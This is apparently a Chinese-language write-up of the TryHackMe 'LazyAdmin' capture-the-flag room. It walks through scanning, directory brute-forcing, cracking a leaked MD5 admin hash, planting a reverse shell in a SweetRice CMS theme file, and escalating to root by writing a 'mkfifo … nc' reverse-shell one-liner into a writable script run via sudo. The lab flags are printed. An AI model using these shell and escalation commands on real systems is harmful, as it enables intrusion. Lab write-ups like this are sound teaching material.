#服务发现
```
┌──(root💀kali)-[~/tryhackme/LazyAdminFinal]
└─# nmap -sV -Pn 10.10.113.182 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 22:02 EDT
Nmap scan report for 10.10.113.182
Host is up (0.37s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
```

#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u http://10.10.113.182 -e* -t 100                                                                                                                                                                           130 ⨯

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-09-23_22-07-17.log

Target: http://10.10.113.182

[22:07:18] Starting: 
[22:07:39] 301 -  316B  - /content  ->  http://10.10.113.182/content/                                             
[22:07:42] 200 -   11KB - /index.html                                                                          

```

只有一个content目录，打开是一个```SweetRice```cms介绍页，继续爆破content目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u http://10.10.113.182/content -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 207627

Error Log: /root/dirsearch/logs/errors-21-09-23_22-58-30.log

Target: http://10.10.113.182/content

[22:58:30] Starting: 
[22:58:31] 200 -    2KB - /content/
[22:58:34] 301 -  323B  - /content/images  ->  http://10.10.113.182/content/images/
[22:58:40] 301 -  319B  - /content/js  ->  http://10.10.113.182/content/js/
[22:58:44] 301 -  320B  - /content/inc  ->  http://10.10.113.182/content/inc/
[22:58:47] 301 -  319B  - /content/as  ->  http://10.10.113.182/content/as/
[22:58:48] 301 -  324B  - /content/_themes  ->  http://10.10.113.182/content/_themes/
[22:58:49] 301 -  327B  - /content/attachment  ->  http://10.10.113.182/content/attachment/

```

在```http://10.10.113.182/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql```找到备份的mysql语句，暴露了cms表名，一个登录凭证
```
用户名：manager
密码：42f749ade7f9e195bf475f37a44cafcb
```

md5密码破解出来是：```Password123```


```http://10.10.113.182/content/as/```是登陆页面

在```/content/license.txt```和```/inc/lastest.txt```验证cms的版本号是1.5.1，在kali搜索这个版本号的cms漏洞
```
┌──(root💀kali)-[~]
└─# searchsploit SweetRice 1.5.1
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                                                                                                 | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                                                                                       | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                                                                                              | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                                                                                         | php/webapps/40700.html
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

上传脚本需要一个登录凭证，使用上面找到的```manager:Password123```，使用40716.py攻击脚本，但是貌似上传不了文件


登录后台，在Theme,选择Footer section template，直接编辑php源码写反弹shell，访问```http://10.10.113.182/content/_themes/default/foot.php```成功反弹到shell，拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/LazyAdminFinal]
└─# nc -lnvp 1234                                      
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.113.182] 46142
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 06:50:08 up  1:48,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

在同目录有一个backup.pl文件，源码内容是执行一个copy.sh文件
而copy.sh是可以编辑的
两个文件所有者是root，如果可以以root的身份执行一个```/etc/copy.sh```批处理文件，我们就可以使用该sh文件来提升到root
```
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f
$ ls -alh /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

#写shell
```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f" > /etc/copy.sh```

#切换tty,查看sudo -l，www-data正好可以用root权限执行/home/itguy/backup.pl
```
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl

```

#与此同时另起一个端口监听，拿到root反弹shell和root.txt
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.113.182] 33518
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```